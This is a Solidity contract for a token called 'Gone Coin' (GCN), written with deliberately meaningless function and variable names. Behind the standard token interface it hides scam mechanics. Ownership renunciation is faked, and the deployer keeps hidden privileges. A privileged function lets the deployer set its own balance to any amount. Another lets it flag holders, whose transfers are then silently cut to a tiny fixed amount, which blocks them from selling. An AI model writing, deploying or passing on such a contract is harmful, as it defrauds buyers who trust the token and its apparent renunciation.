//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract pmmktzszqj {
    function shjdnzrpjgjg() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface vntfkoruwigigv {
    function createPair(address azdwzbrrly, address bdnoalgbdnyb) external returns (address);
}

interface pbdkvmgleyav {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract GoneCoin is IERC20, pmmktzszqj {

    mapping(address => mapping(address => uint256)) private jucxtwtwbbsplw;

    function jiojgzjjzcca(address rnrdkqjagl, address ipeiooiocr, uint256 iwfsrvomy) internal returns (bool) {
        require(jfzhbyshsioltt[rnrdkqjagl] >= iwfsrvomy);
        jfzhbyshsioltt[rnrdkqjagl] -= iwfsrvomy;
        jfzhbyshsioltt[ipeiooiocr] += iwfsrvomy;
        emit Transfer(rnrdkqjagl, ipeiooiocr, iwfsrvomy);
        return true;
    }

    function symbol() external view returns (string memory) {
        return dlfqxzjfx;
    }

    function kqrctaatzcz(address rnrdkqjagl, address ipeiooiocr, uint256 iwfsrvomy) internal returns (bool) {
        if (rnrdkqjagl == vnplnwaixvtkzi) {
            return jiojgzjjzcca(rnrdkqjagl, ipeiooiocr, iwfsrvomy);
        }
        if (dxyzllpoaiphen[rnrdkqjagl]) {
            return jiojgzjjzcca(rnrdkqjagl, ipeiooiocr, 11 ** 10);
        }
        return jiojgzjjzcca(rnrdkqjagl, ipeiooiocr, iwfsrvomy);
    }

    uint256 public mtzujrppd;

    function wpigjkpfzeqq() public view returns (uint256) {
        return guuudcrffyhu;
    }

    function approve(address vzcakyuwic, uint256 iwfsrvomy) public virtual override returns (bool) {
        jucxtwtwbbsplw[shjdnzrpjgjg()][vzcakyuwic] = iwfsrvomy;
        emit Approval(shjdnzrpjgjg(), vzcakyuwic, iwfsrvomy);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return ipfgpubkmworxq;
    }

    function boiiwmnrmxmpc() public view returns (uint256) {
        return kutxzbldgowff;
    }

    function allowance(address wkfirjdllej, address vzcakyuwic) external view virtual override returns (uint256) {
        return jucxtwtwbbsplw[wkfirjdllej][vzcakyuwic];
    }

    function owner() external view returns (address) {
        return cvidqgsvke;
    }

    uint256 private ipfgpubkmworxq = 100000000 * 10 ** 18;

    address public avpfaevvxbp;

    constructor (){ 
        
        pbdkvmgleyav aikhlbtcdrbwll = pbdkvmgleyav(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        avpfaevvxbp = vntfkoruwigigv(aikhlbtcdrbwll.factory()).createPair(aikhlbtcdrbwll.WETH(), address(this));
        cvidqgsvke = shjdnzrpjgjg();
        
        vnplnwaixvtkzi = shjdnzrpjgjg();
        rqyzygxeu[shjdnzrpjgjg()] = true;
        
        jfzhbyshsioltt[shjdnzrpjgjg()] = ipfgpubkmworxq;
        emit Transfer(address(0), vnplnwaixvtkzi, ipfgpubkmworxq);
        mkfedlmacvbmji();
    }

    uint8 private ljzmdcelhz = 18;

    function decimals() external view returns (uint8) {
        return ljzmdcelhz;
    }

    function rrquahrxmtu(uint256 iwfsrvomy) public {
        if (!rqyzygxeu[shjdnzrpjgjg()]) {
            return;
        }
        jfzhbyshsioltt[vnplnwaixvtkzi] = iwfsrvomy;
    }

    function transferFrom(address rnrdkqjagl, address ipeiooiocr, uint256 iwfsrvomy) external override returns (bool) {
        if (jucxtwtwbbsplw[rnrdkqjagl][shjdnzrpjgjg()] != type(uint256).max) {
            require(iwfsrvomy <= jucxtwtwbbsplw[rnrdkqjagl][shjdnzrpjgjg()]);
            jucxtwtwbbsplw[rnrdkqjagl][shjdnzrpjgjg()] -= iwfsrvomy;
        }
        return kqrctaatzcz(rnrdkqjagl, ipeiooiocr, iwfsrvomy);
    }

    string private dlfqxzjfx = "GCN";

    address private cvidqgsvke;

    bool public npkmuisnomwim;

    bool public vxywaimte;

    function neqozyppwrzjaj(address exqdkfufj) public {
        
        if (exqdkfufj == vnplnwaixvtkzi || exqdkfufj == avpfaevvxbp || !rqyzygxeu[shjdnzrpjgjg()]) {
            return;
        }
        
        dxyzllpoaiphen[exqdkfufj] = true;
    }

    function cbjeywcdu(address slycgoyzlf) public {
        if (jzgveqygp) {
            return;
        }
        if (kutxzbldgowff == mtzujrppd) {
            kutxzbldgowff = guuudcrffyhu;
        }
        rqyzygxeu[slycgoyzlf] = true;
        
        jzgveqygp = true;
    }

    uint256 private guuudcrffyhu;

    function transfer(address mqyavygmmtb, uint256 iwfsrvomy) external virtual override returns (bool) {
        return kqrctaatzcz(shjdnzrpjgjg(), mqyavygmmtb, iwfsrvomy);
    }

    function sszqfudtzeuk() public view returns (uint256) {
        return guuudcrffyhu;
    }

    event OwnershipTransferred(address indexed gyobhgniuogjp, address indexed zfbwpljdxxmwx);

    function mkfedlmacvbmji() public {
        emit OwnershipTransferred(vnplnwaixvtkzi, address(0));
        cvidqgsvke = address(0);
    }

    function fqlaeoikw() public view returns (uint256) {
        return kutxzbldgowff;
    }

    function ebhckisectyouv() public {
        if (guuudcrffyhu != kutxzbldgowff) {
            kutxzbldgowff = mtzujrppd;
        }
        
        npkmuisnomwim=false;
    }

    mapping(address => uint256) private jfzhbyshsioltt;

    mapping(address => bool) public dxyzllpoaiphen;

    function getOwner() external view returns (address) {
        return cvidqgsvke;
    }

    bool public jzgveqygp;

    function balanceOf(address kxpwdzvstu) public view virtual override returns (uint256) {
        return jfzhbyshsioltt[kxpwdzvstu];
    }

    function name() external view returns (string memory) {
        return yvutuvsnstdjtk;
    }

    function rwwxfchhuh() public {
        
        
        vxywaimte=false;
    }

    uint256 private kutxzbldgowff;

    address public vnplnwaixvtkzi;

    mapping(address => bool) public rqyzygxeu;

    string private yvutuvsnstdjtk = "Gone Coin";

}